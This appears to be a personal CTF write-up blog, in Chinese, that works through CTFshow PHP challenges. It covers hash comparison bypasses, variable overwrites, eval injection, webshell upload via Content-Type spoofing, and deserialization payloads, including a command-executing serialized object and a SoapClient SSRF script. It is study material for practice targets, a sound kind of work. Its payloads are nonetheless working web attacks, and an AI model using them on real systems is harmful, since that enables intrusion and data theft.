<h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>数组绕过</p>
<p>也可以弱碰撞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aaK1STfY</span><br><span class="line"><span class="comment">//0e76658526655756207688271159624026011393</span></span><br><span class="line"></span><br><span class="line">aaO8zKZF</span><br><span class="line"><span class="comment">//0e89257456677279068558073954252716165668</span></span><br></pre></td></tr></table></figure>

<h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><p>​&#96;&#96;&#96;php<br>include(‘flag.php’);<br>error_reporting(0);<br>$error&#x3D;’你还想要flag嘛？’;<br>$suces&#x3D;’既然你想要那给你吧！’;<br>foreach($_GET as $key &#x3D;&gt; $value){<br>    if($key&#x3D;&#x3D;&#x3D;’error’){<br>        die(“what are you doing?!”);<br>    }<br>    $$key&#x3D;$$value;<br>}foreach($_POST as $key &#x3D;&gt; $value){<br>    if($value&#x3D;&#x3D;&#x3D;’flag’){<br>        die(“what are you doing?!”);<br>    }<br>    $$key&#x3D;$$value;<br>}<br>if(!($_POST[‘flag’]&#x3D;&#x3D;$flag)){<br>    die($error);<br>}<br>echo “your are good”.$flag.”\n”;<br>die($suces);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先看两个能输入的地方</span><br><span class="line"></span><br><span class="line">`die($error);`这个地方我们如果把\$error=\$flag就可以输出flag了，但是value等于flag会拦截，所以我们让suces=flag,error=suces。</span><br><span class="line"></span><br><span class="line">也就是get发suces=flag，POST发error=suces。</span><br><span class="line"></span><br><span class="line">那么我们要走`die($suces);`，那么我们要让flag=\$flag，所以我们要控制\$flag，先让flag的值存在suces里，再控制它</span><br><span class="line"></span><br><span class="line">`? suce=flag`然后`flag=`</span><br><span class="line"></span><br><span class="line">最后POST传`flag=`或者不传。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### web106</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        echo $flag;</span><br></pre></td></tr></table></figure>

<p>数组绕过</p>
<h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>



<p>ai能写出来</p>
<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><p>​&#96;&#96;&#96;php<br>include(“flag.php”);</p>
<p>if (ereg (“^[a-zA-Z]+$”, $_GET[‘c’])&#x3D;&#x3D;&#x3D;FALSE)  {<br>    die(‘error’);}<br>if(intval(strrev($_GET[‘c’]))&#x3D;&#x3D;0x36d){<br>    echo $flag;<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ereg(&quot;正则表达式&quot;, 字符串)  匹配失败是false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>if (ereg (“^[a-zA-Z]+$”, $_GET[‘c’])&#x3D;&#x3D;&#x3D;FALSE)  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这一句要求传的c全是字母</span><br><span class="line"></span><br><span class="line">strrev 把字符串倒过来</span><br><span class="line"></span><br><span class="line">`0x36d` 是十六进制数，等于 **877**</span><br><span class="line"></span><br><span class="line">`intval()` 是把一个值转成整数，并且用的是弱比较</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>?c&#x3D;a%00778</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### web109（纠结语法中）</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br></pre></td></tr></table></figure>

<p>&#x2F;[a-zA-Z]+&#x2F; 至少一个英文字母的意思</p>
<p>echo new 很容易就想到类</p>
<blockquote>
<p>Exception 类有一个特殊的方法叫做 <code>__toString()</code>，当你 <code>echo Exception对象</code> 时，它会自动调用这个魔术方法，并把异常信息（也就是 <code>system()</code> 的返回值）打印出来！</p>
</blockquote>
<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>上传一个png文件，改成Content-Type: application&#x2F;x-php,上传一句话木马，flag.php在&#x2F;var&#x2F;www&#x2F;html里。</p>
<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>抓包修改Content-Type: image&#x2F;png</p>
<h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br></pre></td></tr></table></figure>

<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($user));</span><br><span class="line">//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>多了一步对username和password的判断，要求不想等</p>
<p>只要在实例化对象里修改两个属性的值就可以</p>
<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$answer</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$answer</span>));</span><br></pre></td></tr></table></figure>



<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p><code>if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))&#123;</code></p>
<p>过滤了O:数字和C：数字，由wakeup绕过想到可以加“+”，但是要注意这里有两个O:，需要加两次，这里的属性为了方便都是public，上一题的payload不能直接用。</p>
<h3 id="web259"><a href="#web259" class="headerlink" title="?web259?"></a>?web259?</h3><p>了解了一下SoapClient这个类，但说实话拿着网上脚本跑出来的payload会报错（是要先把flag写入flag.txt还是要用yakit?）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: SoapClient::__doRequest(): supplied argument is not a valid Stream-Context resource in /var/www/html/index.php on line 8</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://127.0.0.1/flag.php&#x27;;</span><br><span class="line">$post_string = &#x27;token=ctfshow&#x27;;</span><br><span class="line">$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;.&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt; &quot;ssrf&quot;));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(&#x27;^^&#x27;,&quot;\r\n&quot;,$a);</span><br><span class="line">echo urlencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>本来以为用的是SplFileObject类，查了一下发现不能实例化。</p>
<p>&#x2F;&#x2F;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22ssrf%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22wupco%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</p>
<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>?ctfshow&#x3D;ctfshow&#x3D;ctfshow_i_love_36D</p>
<p>这个题是在。。？</p>
<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    